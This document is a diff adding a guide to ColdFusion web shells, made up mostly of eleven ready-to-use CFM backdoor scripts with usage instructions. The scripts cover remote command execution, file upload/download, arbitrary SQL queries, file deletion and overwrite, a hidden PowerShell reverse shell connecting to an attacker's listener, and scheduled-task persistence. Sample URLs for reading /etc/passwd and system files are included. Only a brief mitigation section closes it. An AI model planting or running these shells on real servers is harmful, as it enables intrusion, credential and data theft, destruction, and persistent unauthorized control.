@@ -1,0 +1,433 @@
+ColdFusion (CFM) Web Shell Guide
+This guide provides an overview of ColdFusion Markup (CFM) web shells, their functionality, common techniques, and how to use the provided example shell.
+
+What is a Web Shell?
+A web shell is a malicious script uploaded to a web server to enable remote administration of the server. It provides a backdoor that allows an attacker to execute commands, browse files, upload/download data, and potentially escalate privileges on the compromised system. Web shells are typically written in scripting languages supported by web servers, such as PHP, ASP, JSP, and in this case, ColdFusion.
+
+Understanding CFM Web Shells
+ColdFusion (CFM) is a scripting language and platform for developing dynamic web applications. Like other server-side scripting languages, it can be abused to create web shells if vulnerabilities exist that allow arbitrary file uploads or code injection.
+
+How CFM Web Shells Work
+CFM web shells leverage built-in ColdFusion tags and functions to interact with the underlying operating system. The core principle involves allowing an attacker to pass arbitrary commands to a ColdFusion page, which then executes those commands on the server.
+
+Key ColdFusion features often abused in CFM web shells include:
+
+<cfexecute>: This tag is the most critical for command execution. It allows ColdFusion to execute native programs on the server's operating system. Attackers can pass system commands (e.g., cmd.exe on Windows, bash or sh on Linux) along with arguments to this tag.
+File System Functions: Functions like cffile (for file uploads, downloads, and manipulation), cfdirectory (for listing and managing directories), and ExpandPath() (for resolving absolute paths) are used to navigate the file system, retrieve sensitive data, and maintain persistence.
+Database Interaction: If the ColdFusion application has database connectivity, a web shell might use tags like cfquery to interact with the database, potentially dumping credentials or sensitive application data.
+Dynamic Code Execution: In some cases, more advanced CFM shells might attempt to evaluate arbitrary ColdFusion code using techniques that bypass typical security measures, allowing for even greater control.
+
+
+
+
+1. Basic CMF Shell
+
+<cfparam name="url.cmd" default="">
+
+<cfif len(url.cmd) GT 0>
+    <cfoutput>
+        <pre>
+            <cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="commandOutput" timeout="60"></cfexecute>
+            #HTMLEditFormat(commandOutput)#
+        </pre>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?cmd=your_command_here
+    </cfoutput>
+</cfif>
+
+
+
+
+How to Use This CFM Web Shell (assuming successful upload)
+Upload the .cfm file: Save the provided code as a .cfm file (e.g., shell.cfm) and upload it to a web-accessible directory on a vulnerable ColdFusion server. This typically requires a file upload vulnerability or direct access to the server.
+
+Access the shell via URL: Open your web browser and navigate to the uploaded shell's URL.
+
+Example: http://example.com/path/to/shell.cfm
+Execute commands: Append ?cmd= followed by your desired command to the URL.
+
+To list directory contents (Windows):
+http://example.com/path/to/shell.cfm?cmd=dir
+
+To display current user (Windows):
+http://example.com/path/to/shell.cfm?cmd=whoami
+
+To display network configuration (Windows):
+http://example.com/path/to/shell.cfm?cmd=ipconfig /all
+
+To read a file (Windows, assuming it's in the same directory):
+http://example.com/path/to/shell.cfm?cmd=type index.cfm
+
+To read the hosts file (Windows):
+http://example.com/path/to/shell.cfm?cmd=type C:\windows\system32\drivers\etc\hosts
+
+If the server is Linux (you'd need to change cmd.exe to bash or sh in the shell code):
+http://example.com/path/to/shell.cfm?cmd=ls -la
+http://example.com/path/to/shell.cfm?cmd=cat /etc/passwd
+
+
+
+
+
+2.  File Upload/Download Shell
+This shell allows for basic file management: uploading files to the server and downloading existing files from the server.
+How it works???:
+Upload: If a file is submitted via a form, it attempts to save it to a specified directory (defaulting to the current directory).
+Download: If a file parameter is provided in the URL, it reads the content of that file and outputs it to the browser, allowing for easy download.
+Usage:
+Upload via POST request (e.g., HTML form with enctype="multipart/form-data").
+Download: ?file=path/to/your/file.txt
+
+<cfparam name="url.file" default="">
+<cfparam name="form.uploadFile" default="">
+
+<cfif structKeyExists(form, "uploadFile") AND len(form.uploadFile) GT 0>
+    <cftry>
+        <cffile action="upload" filefield="uploadFile" destination="#ExpandPath('.')#" nameconflict="overwrite">
+        <cfoutput>File #form.uploadFile.serverFile# uploaded successfully to #ExpandPath('.')#</cfoutput>
+        <cfcatch type="any">
+            <cfoutput>Error uploading file: #cfcatch.message#</cfoutput>
+        </cfcatch>
+    </cftry>
+<cfelseif len(url.file) GT 0>
+    <cftry>
+        <cffile action="read" file="#ExpandPath(url.file)#" variable="fileContent">
+        <cfheader name="Content-Disposition" value="attachment; filename=#ListLast(url.file, '\/')#">
+        <cfcontent type="application/octet-stream" variable="#toBinary(toBase64(fileContent))#">
+        <cfoutput>#fileContent#</cfoutput>
+        <cfcatch type="any">
+            <cfoutput>Error reading file: #cfcatch.message#</cfoutput>
+        </cfcatch>
+    </cftry>
+<cfelse>
+    <cfoutput>
+        <h3>Upload File:</h3>
+        <form action="" method="post" enctype="multipart/form-data">
+            <input type="file" name="uploadFile"><br>
+            <input type="submit" value="Upload">
+        </form>
+        <h3>Download File:</h3>
+        Usage: ?file=your_file_path.txt
+    </cfoutput>
+</cfif>
+
+
+
+
+
+3. Directory Listing Shell
+This shell provides a simple way to list the contents of directories on the server.
+
+What it does: Takes a path parameter and lists the files and directories within that path. If no path is given, it defaults to the current directory.
+Usage: ?path=C:\Windows or ?path=/etc
+
+<cfparam name="url.path" default="#ExpandPath('.')#">
+
+<cfoutput>
+    <h2>Directory Listing for: #HTMLEditFormat(url.path)#</h2>
+    <cfdirectory action="list" directory="#url.path#" name="dirList" sort="type ASC, name ASC">
+    <table border="1">
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Date Last Modified</th>
+        </tr>
+        <cfoutput query="dirList">
+            <tr>
+                <td>
+                    <cfif dirList.type EQ "dir">
+                        <a href="?path=#URLEncodedFormat(dirList.directory & '/' & dirList.name)#">#HTMLEditFormat(dirList.name)#</a>
+                    <cfelse>
+                        #HTMLEditFormat(dirList.name)#
+                    </cfif>
+                </td>
+                <td>#HTMLEditFormat(dirList.type)#</td>
+                <td>#HTMLEditFormat(dirList.size)#</td>
+                <td>#HTMLEditFormat(DateFormat(dirList.datelastmodified) & " " & TimeFormat(dirList.datelastmodified))#</td>
+            </tr>
+        </cfoutput>
+    </table>
+</cfoutput>
+
+
+
+
+4.Basic Command Execution with Input Field
+Similar to the initial example, but provides an HTML input field for easier command entry.
+
+What it does: Renders a form where a user can enter a system command. The command is then executed using <cfexecute>.
+Usage: Enter commands in the provided text field and submit.
+
+<cfparam name="form.cmd" default="">
+
+<cfoutput>
+    <h2>Command Execution</h2>
+    <form action="" method="post">
+        <input type="text" name="cmd" size="80" value="#HTMLEditFormat(form.cmd)#">
+        <input type="submit" value="Execute">
+    </form>
+    <cfif len(form.cmd) GT 0>
+        <h3>Output:</h3>
+        <pre>
+            <cfexecute name="cmd.exe" arguments="/c #form.cmd#" variable="commandOutput" timeout="60"></cfexecute>
+            #HTMLEditFormat(commandOutput)#
+        </pre>
+    </cfif>
+</cfoutput>
+
+
+
+
+5. Code Evaluator Shell (Highly Dangerous)
+This type of shell attempts to execute arbitrary ColdFusion code, offering immense control. This is usually only possible if security sandboxing is misconfigured or a critical vulnerability allows it.
+
+What it does: Takes a code parameter and attempts to evaluate and execute it as ColdFusion code using cfinclude or cfcontent. This is generally not possible with standard secure ColdFusion configurations without exploiting specific vulnerabilities.
+Usage: ?code=WriteOutput("Hello from ColdFusion!"); (Highly unlikely to work on a secure server without exploitation)
+
+<cfparam name="url.code" default="">
+
+<cfif len(url.code) GT 0>
+    <cfoutput>
+        <h2>ColdFusion Code Execution</h2>
+        <cftry>
+            <cfset tempFileName = ExpandPath("./temp_eval_" & createUUID() & ".cfm")>
+            <cffile action="write" file="#tempFileName#" output="#url.code#">
+            <cfinclude template="#tempFileName#">
+            <cffile action="delete" file="#tempFileName#">
+            <cfcatch type="any">
+                <cfoutput>Error executing code: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?code=YourColdFusionCodeHere
+        (Note: Direct CFML evaluation often requires specific vulnerabilities or misconfigurations.)
+    </cfoutput>
+</cfif>
+
+
+
+6. Database Interaction Shell
+This shell allows interaction with the default ColdFusion DSNs (Data Source Names).
+
+What it does: Takes a sql parameter and attempts to execute it as an SQL query against a specified data source. This is highly effective if the web application's database credentials are tied to the ColdFusion execution context.
+Usage: ?dsn=your_dsn&sql=SELECT * FROM users; (replace your_dsn with a known DSN)
+
+<cfparam name="url.dsn" default="">
+<cfparam name="url.sql" default="">
+
+<cfif len(url.dsn) GT 0 AND len(url.sql) GT 0>
+    <cfoutput>
+        <h2>Database Query for DSN: #HTMLEditFormat(url.dsn)#</h2>
+        <cftry>
+            <cfquery name="queryResult" datasource="#url.dsn#">
+                #PreserveSingleQuotes(url.sql)#
+            </cfquery>
+            <table border="1">
+                <cfoutput query="queryResult" group="column_names">
+                    <tr>
+                        <cfloop list="#queryResult.columnList#" index="col">
+                            <th>#HTMLEditFormat(col)#</th>
+                        </cfloop>
+                    </tr>
+                </cfoutput>
+                <cfoutput query="queryResult">
+                    <tr>
+                        <cfloop list="#queryResult.columnList#" index="col">
+                            <td>#HTMLEditFormat(queryResult[col][currentRow])#</td>
+                        </cfloop>
+                    </tr>
+                </cfoutput>
+            </table>
+            <cfcatch type="any">
+                <cfoutput>Error executing query: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?dsn=your_datasource_name&sql=your_sql_query
+    </cfoutput>
+</cfif>
+
+
+
+7. File Delete Shell
+A destructive shell that allows removal of files.
+
+What it does: Takes a delete_file parameter and attempts to delete the specified file.
+Usage: ?delete_file=path/to/sensitive.log
+
+<cfparam name="url.delete_file" default="">
+
+<cfif len(url.delete_file) GT 0>
+    <cfoutput>
+        <h2>File Deletion</h2>
+        <cftry>
+            <cffile action="delete" file="#ExpandPath(url.delete_file)#">
+            <cfoutput>File '#HTMLEditFormat(url.delete_file)#' deleted successfully.</cfoutput>
+            <cfcatch type="any">
+                <cfoutput>Error deleting file: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?delete_file=path/to/file.txt
+    </cfoutput>
+</cfif>
+
+
+
+8. File Renaming/Moving Shell
+Allows for reorganizing or hiding files on the server.
+
+What it does: Takes old_name and new_name parameters to rename or move a file.
+Usage: ?old_name=old.txt&new_name=new.txt or ?old_name=file.txt&new_name=subdir/file.txt
+
+<cfparam name="url.old_name" default="">
+<cfparam name="url.new_name" default="">
+
+<cfif len(url.old_name) GT 0 AND len(url.new_name) GT 0>
+    <cfoutput>
+        <h2>File Rename/Move</h2>
+        <cftry>
+            <cffile action="rename" source="#ExpandPath(url.old_name)#" destination="#ExpandPath(url.new_name)#">
+            <cfoutput>File '#HTMLEditFormat(url.old_name)#' renamed/moved to '#HTMLEditFormat(url.new_name)#' successfully.</cfoutput>
+            <cfcatch type="any">
+                <cfoutput>Error renaming/moving file: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?old_name=old_file.txt&new_name=new_file.txt
+    </cfoutput>
+</cfif>
+
+
+
+9. Simple Reverse Shell Trigger
+This shell attempts to initiate a reverse shell connection by executing a local script. This assumes a pre-uploaded script (e.g., Python reverse shell, Netcat) or a system binary for network communication.
+Note: The PowerShell reverse shell command is a common example for Windows. For Linux, you'd replace powershell.exe command with a bash or python reverse shell payload.
+What it does: Executes a command that aims to connect back to a specified IP address and port (attacker's listener). This requires an attacker to have a listener set up.
+Usage: ?ip=ATTACKER_IP&port=ATTACKER_PORT (e.g., ?ip=192.168.1.100&port=4444)
+
+<cfparam name="url.ip" default="">
+<cfparam name="url.port" default="">
+
+<cfif len(url.ip) GT 0 AND len(url.port) GT 0>
+    <cfoutput>
+        <h2>Attempting Reverse Shell</h2>
+        <cftry>
+            <cfset command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('#url.ip#',#url.port#);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '#(pwd).Path#> ';$bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($bytes2,0,$bytes2.Length)};$client.Close()""">
+            <cfexecute name="cmd.exe" arguments="/c #command#" variable="reverseShellOutput" timeout="5"></cfexecute>
+            <cfoutput>Reverse shell command initiated. Check your listener on #HTMLEditFormat(url.ip#:#url.port#.</cfoutput>
+            <cfcatch type="any">
+                <cfoutput>Error initiating reverse shell: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?ip=ATTACKER_IP&port=ATTACKER_PORT
+        (Note: Requires PowerShell for this specific payload, or a pre-uploaded netcat/python shell for other OS)
+    </cfoutput>
+</cfif>
+
+
+
+
+10. Scheduled Task Creation (Persistence) Shell
+This shell attempts to create a scheduled task on Windows, a common way to achieve persistence.
+
+What it does: Creates a scheduled task using schtasks.exe to run a specified command at a specific time or interval.
+Usage: ?task_name=MyBackdoor&command=calc.exe&time=14:00 (runs calc.exe at 2 PM daily)
+
+<cfparam name="url.task_name" default="">
+<cfparam name="url.command" default="">
+<cfparam name="url.time" default=""> <cfif len(url.task_name) GT 0 AND len(url.command) GT 0>
+    <cfoutput>
+        <h2>Creating Scheduled Task</h2>
+        <cftry>
+            <cfset schtasks_cmd = "schtasks /create /tn ""#url.task_name#"" /tr ""#url.command#"" /sc daily">
+            <cfif len(url.time) GT 0>
+                <cfset schtasks_cmd = schtasks_cmd & " /st #url.time#">
+            </cfif>
+            <cfexecute name="cmd.exe" arguments="/c #schtasks_cmd#" variable="taskOutput" timeout="60"></cfexecute>
+            <cfoutput>
+                Task creation output:<br>
+                <pre>#HTMLEditFormat(taskOutput)#</pre>
+            </cfoutput>
+            <cfcatch type="any">
+                <cfoutput>Error creating task: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?task_name=MyTask&command=C:\path\to\script.bat&time=HH:MM (optional)
+        (Note: Requires appropriate permissions.)
+    </cfoutput>
+</cfif>
+
+
+
+11. Simple Arbitrary File Write Shell
+This shell allows writing arbitrary content to a file on the server. This can be used to create new files or modify existing ones, crucial for injecting malicious scripts or configuration changes.
+
+What it does: Takes filepath and content parameters. It then writes the content to the filepath.
+Usage: ?filepath=new_script.cfm&content=%3Cscript%3Ealert('Pwned!');%3C/script%3E (URL-encoded <script>alert('Pwned!');</script>)
+
+<cfparam name="url.filepath" default="">
+<cfparam name="url.content" default="">
+
+<cfif len(url.filepath) GT 0 AND len(url.content) GT 0>
+    <cfoutput>
+        <h2>Arbitrary File Write</h2>
+        <cftry>
+            <cffile action="write" file="#ExpandPath(url.filepath)#" output="#URLDecode(url.content)#" charset="utf-8">
+            <cfoutput>Content written to '#HTMLEditFormat(url.filepath)#' successfully.</cfoutput>
+            <cfcatch type="any">
+                <cfoutput>Error writing file: #cfcatch.message#</cfoutput>
+            </cfcatch>
+        </cftry>
+    </cfoutput>
+<cfelse>
+    <cfoutput>
+        Usage: ?filepath=path/to/new_file.txt&content=YourContentHere
+        (Remember to URL-encode content if it contains special characters.)
+    </cfoutput>
+</cfif>
+
+
+
+
+
+~~~~~~~~~Defense and Mitigation~~~~~~~~~~~
+Input Validation and Sanitization: This is the most critical defense. All user input, especially anything that might be used in file paths, command arguments, or database queries, must be rigorously validated and sanitized to prevent injection attacks.
+Principle of Least Privilege: Web servers and ColdFusion applications should run with the lowest possible privileges required for their operation. This limits the damage an attacker can do even if a shell is uploaded.
+
+Disable Unnecessary Functions: If certain ColdFusion tags like <cfexecute> are not absolutely necessary for the application's functionality, they should be disabled in the ColdFusion administrator settings or locked down using sandbox security.
+
+Web Application Firewall (WAF): A WAF can help detect and block common web shell signatures and attack patterns.
+
+File Upload Restrictions: Implement strict controls on file uploads, including:
+
+Whitelist Allowed Extensions: Only permit known safe file extensions (e.g., .jpg, .png, .pdf). Blacklisting is insufficient as attackers can bypass it.
+
+Content Type Validation: Validate the MIME type of uploaded files.
+
+File Renaming: Rename uploaded files to prevent execution of malicious scripts.
+
+Store Uploads Outside Web Root: Store uploaded files in a non-web-accessible directory and serve them through a script if needed.
+
+Regular Security Audits and Penetration Testing: Proactively identify and fix vulnerabilities before attackers can exploit them.
+
+Server Hardening: Keep operating systems and ColdFusion versions patched and up-to-date. Remove unnecessary software and services.
+
+Monitoring and Logging: Implement robust logging of web server and application activity. Monitor for unusual file access, command execution, or other suspicious behavior. Intrusion detection systems (IDS) can help here.
